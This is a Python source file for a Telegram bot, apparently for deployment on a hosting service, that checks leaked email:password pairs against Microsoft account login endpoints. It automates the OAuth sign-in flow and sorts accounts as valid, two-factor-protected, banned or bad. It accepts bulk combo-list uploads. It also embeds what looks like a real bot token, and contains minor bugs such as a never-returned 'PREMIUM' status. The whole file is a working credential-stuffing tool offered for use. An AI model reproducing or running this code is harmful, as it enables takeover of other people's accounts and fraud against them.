import os, re, time, json, uuid, threading, concurrent.futures, asyncio
from datetime import datetime
from urllib.parse import quote, unquote
import requests
from flask import Flask, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get('8855828069:AAHdIeu1UfkpdvbrRstqp9B941oTuQNnKlU', '')
PORT = int(os.environ.get('PORT', 5000))
app = Flask(__name__)

class XboxChecker:
    def check(self, email, password):
        try:
            session = requests.Session()
            corr_id = str(uuid.uuid4())
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0"}, timeout=15)
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth://com.microsoft.outlooklite"
            r2 = session.get(url2, allow_redirects=True, timeout=15)
            ppft = re.search(r'name="PPFT" value="([^"]+)"', r2.text)
            if not ppft:
                return {"status": "BAD"}
            login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft.group(1)}"
            r3 = session.post("https://login.live.com/ppsecure/post.srf", data=login_data, allow_redirects=False, timeout=15)
            if "incorrect" in r3.text:
                return {"status": "BAD"}
            if "confirm" in r3.text:
                return {"status": "2FACTOR"}
            if "Abuse" in r3.text:
                return {"status": "BANNED"}
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            token_data = f"grant_type=authorization_code&code={code_match.group(1)}&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth://com.microsoft.outlooklite"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            return {"status": "FREE"}
        except:
            return {"status": "ERROR"}

async def start(update, context):
    await update.message.reply_text("🎮 *XBOX CHECKER BOT*\n\n/check email:pass - Check account\nSend .txt file - Bulk check\n\nchecker by @zx_levi | @binswithtips", parse_mode="Markdown")

async def check_cmd(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /check email:password")
        return
    cred = context.args[0]
    if ":" not in cred:
        await update.message.reply_text("Invalid format! Use: email:password")
        return
    email, pwd = cred.split(":", 1)
    await update.message.reply_text(f"🔍 Checking {email}...")
    result = XboxChecker().check(email, pwd)
    status = result.get("status")
    if status == "PREMIUM":
        msg = f"✅ PREMIUM | {email}"
    elif status == "FREE":
        msg = f"🆓 FREE | {email}"
    elif status == "2FACTOR":
        msg = f"🔒 2FA REQUIRED | {email}"
    elif status == "BANNED":
        msg = f"🚫 BANNED | {email}"
    else:
        msg = f"❌ BAD | {email}"
    await update.message.reply_text(msg + "\n\nchecker by @zx_levi | @binswithtips")

async def handle_file(update, context):
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("Send .txt file only")
        return
    await update.message.reply_text("📥 Processing...")
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_{int(time.time())}.txt"
    await file.download_to_drive(path)
    with open(path) as f:
        combos = [l.strip() for l in f if ":" in l]
    os.remove(path)
    free = 0
    bad = 0
    for combo in combos[:50]:
        try:
            email, pwd = combo.split(":", 1)
            r = XboxChecker().check(email, pwd)
            if r.get("status") == "FREE":
                free += 1
            else:
                bad += 1
        except:
            bad += 1
        await asyncio.sleep(0.5)
    await update.message.reply_text(f"✅ Done!\n🆓 Free: {free}\n❌ Bad: {bad}\n\nchecker by @zx_levi | @binswithtips")

def run_bot():
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("check", check_cmd))
    app_bot.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    print("🤖 Bot polling started...")
    app_bot.run_polling()

@app.route('/')
def index():
    return jsonify({"status": "Xbox Checker Bot Running", "watermark": "@zx_levi | @binswithtips"})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

if __name__ == '__main__':
    print("=" * 50)
    print("XBOX CHECKER BOT STARTING...")
    print("checker by @zx_levi | @binswithtips")
    print("=" * 50)
    
    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN not set in environment variables!")
        print("Go to Render Dashboard → Environment → Add BOT_TOKEN")
    else:
        print(f"✅ Bot Token: {BOT_TOKEN[:15]}...")
        print("✅ Starting bot thread...")
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        print("✅ Bot is running!")
        print("✅ Flask server starting...")
        app.run(host='0.0.0.0', port=PORT)
